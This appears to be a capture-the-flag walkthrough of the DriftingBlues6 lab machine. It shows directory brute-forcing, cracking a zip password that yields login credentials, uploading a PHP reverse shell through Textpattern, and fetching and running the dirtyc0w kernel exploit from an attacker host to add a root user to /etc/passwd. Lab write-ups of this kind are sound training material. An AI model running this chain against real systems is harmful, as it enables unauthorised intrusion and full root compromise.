### Initial Foothold
autorecon 192.168.138.219

Directory buster 
```
feroxbuster -u http://192.168.138.219 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp,zip" -k     
http://192.168.138.219/robots.txt
feroxbuster -u http://192.168.138.219/textpattern/textpattern/-t 10 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp,zip" -v -k -n -e -r
http://192.168.138.219/textpattern/textpattern/textpattern
```
Found a robots.txt which told me to include .zip in my directory busting.
Further busted `/textpattern/textpattern/` to reveal `/textpattern/textpattern/textpattern` 
We found out its using textpattern v4.8.3 which has an RCE on exploitsdb but requires credentials.

Go around busting for credentials with a different wordlist.
```
feroxbuster -u http://192.168.138.219 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x "txt,html,php,asp,aspx,jsp,zip" -k 
200      GET        2l        7w      227c http://192.168.138.219/spammer
200      GET        2l        7w      227c http://192.168.138.219/spammer.zip
```

```
┌──(kali㉿kali)-[~/offsec/driftingblues6]
└─$ unzip spammer.zip 
Archive:  spammer.zip
[spammer.zip] creds.txt password: 
┌──(kali㉿kali)-[~/offsec/driftingblues6]
└─$ zip2john spammer.zip > zip_hash.txt            
┌──(kali㉿kali)-[~/offsec/driftingblues6]
└─$ john -w=/usr/share/wordlists/rockyou.txt zip_hash.txt 
myspace4         (spammer.zip/creds.txt)     
┌──(kali㉿kali)-[~/offsec/driftingblues6]
└─$ unzip spammer.zip                      
Archive:  spammer.zip
[spammer.zip] creds.txt password: myspace4
 extracting: creds.txt               
```
`mayer:lionheart`

Login `http://192.168.138.219/textpattern/textpattern/` and click on files section to upload a php-reverse-shell. Go to admin -> preferences -> admin and see that the file is stored under /textpattern/files. 
Turn on penelope and head towards.
`http://192.168.138.219/textpattern/files/php-reverse-shell.php`

### Privesc
run linpeas.sh to know that this is weak to dirtyc0w.
cpy and send dirtyc0w over.

```
www-data@driftingblues:/tmp$ wget http://192.168.45.216:8000/dirtyc0w
www-data@driftingblues:/tmp$ uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
www-data@driftingblues:/tmp$ chmod +x dirtyc0w
www-data@driftingblues:/tmp$ ./dirtyc0w
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash
mmap: 7fbb87b85000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'root'.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@driftingblues:/tmp$ su firefart
Password: 
firefart@driftingblues:/tmp# cd /root
firefart@driftingblues:~# cat proof.txt
```